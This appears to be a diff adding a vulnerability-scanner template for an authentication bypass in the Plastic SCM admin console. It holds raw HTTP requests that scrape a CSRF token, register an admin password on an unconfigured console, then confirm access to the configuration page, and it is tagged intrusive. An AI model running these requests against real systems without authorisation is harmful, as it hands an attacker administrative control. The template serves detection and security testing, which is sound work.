@@ -1,0 +1,55 @@
+id: unauthorized-plastic-scm
+
+info:
+  name: Plastic Admin Console - Authentication Bypass
+  author: DEENA
+  severity: critical
+  description: A Plastic Admin console was discovered.
+  reference:
+    - https://infosecwriteups.com/story-of-google-hall-of-fame-and-private-program-bounty-worth-53559a95c468
+  classification:
+    cvss-metrics: AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cwe-id: CWE-288
+  metadata:
+    max-request: 3
+  tags: plastic,misconfig,intrusive,vuln
+
+http:
+  - raw:
+      - |
+        GET /account/register HTTP/1.1
+        {{Hostname}}
+      - |
+        POST /account/register HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Referer: {{BaseURL}}/account/register
+        Connection: close
+
+        Password={{randstr}}&ConfirmPassword={{randstr}}&RememberMe=true&__RequestVerificationToken={{csrf}}&RememberMe=false
+      - |
+        GET /configuration HTTP/1.1
+        {{Hostname}}
+
+    extractors:
+      - type: regex
+        part: body
+        internal: true
+        group: 1
+        name: csrf
+        regex:
+          - 'RequestVerificationToken" type="hidden" value="([A-Za-z0-9_-]+)" \/>'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "<title>Network - Plastic SCM</title>"
+        part: body
+
+      - type: status
+        status:
+          - 200
+# digest: 4a0a00473045022100aba442c96a23aa2d55550fdb3909059fb140c1772e6330e13b109cc480d8a5bc022074c18bbcd28fa0818c1912d896ccfc709bba575577b3b8ca88f547d9aeafcfdd:922c64590222798bb761d5b6d8e72950
